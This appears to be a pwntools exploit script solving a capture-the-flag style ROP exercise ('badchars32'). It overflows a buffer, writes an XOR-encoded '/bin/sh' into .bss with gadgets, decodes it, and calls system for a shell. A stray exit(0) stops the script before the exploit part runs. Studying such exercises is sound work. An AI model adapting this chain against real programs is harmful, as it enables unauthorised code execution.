# -*- coding: utf-8 -*-

badchars = [98, 105, 99, 47, 32, 102, 110, 115]
bin_sh = "/bin/sh\x00"
xorNum = 1
while 1:
  for x in bin_sh:
      tmp = ord(x) ^ xorNum
      if tmp in badchars:
          xorNum = xorNum + 1
          break
      if x == "\x00":
          xorNum = xorNum + 1
          print xorNum
  if xorNum == 0xff:
      break
exit(0)
from pwn import *
p = process('./badchars32')
p.recvuntil("> ")
# ROPgadget --binary ./badchars32 --only "mov|ret"
# 0x08048893 : mov dword ptr [edi], esi ; ret
mov_edi_esi = 0x08048893
# ROPgadget --binary ./badchars32 --only "xor|ret"
# 0x08048890 : xor byte ptr [ebx], cl ; ret
xor_ebx_cl = 0x08048890
# ROPgadget --binary ./badchars32 --only "pop|ret"
# 0x08048896 : pop ebx ; pop ecx ; ret
# 0x08048899 : pop esi ; pop edi ; ret
pop_ebx_ecx_ret = 0x08048896
pop_esi_edi_ret = 0x08048899
call_system = 0x080484E0
bss_addr = 0x0804a040
sh = "/bin/sh\x00"
xorsh = ""
xorNum = 3
for x in sh:
    xorsh += chr(ord(x) ^ xorNum)

# raw_input()

payload = "a" * 44 

# write xorsh to bss
payload += p32(pop_esi_edi_ret)
payload += xorsh[0:4]
payload += p32(bss_addr)
payload += p32(mov_edi_esi)

payload += p32(pop_esi_edi_ret)
payload += xorsh[4:8]
payload += p32(bss_addr+4)
payload += p32(mov_edi_esi)

# xor 
for x in xrange(0,len(sh)):
    payload += p32(pop_ebx_ecx_ret)
    payload += p32(bss_addr + x)
    payload += p32(xorNum)
    payload += p32(xor_ebx_cl)

payload += p32(call_system)
payload += "aaaa"
payload += p32(bss_addr)

p.sendline(payload)
p.interactive()


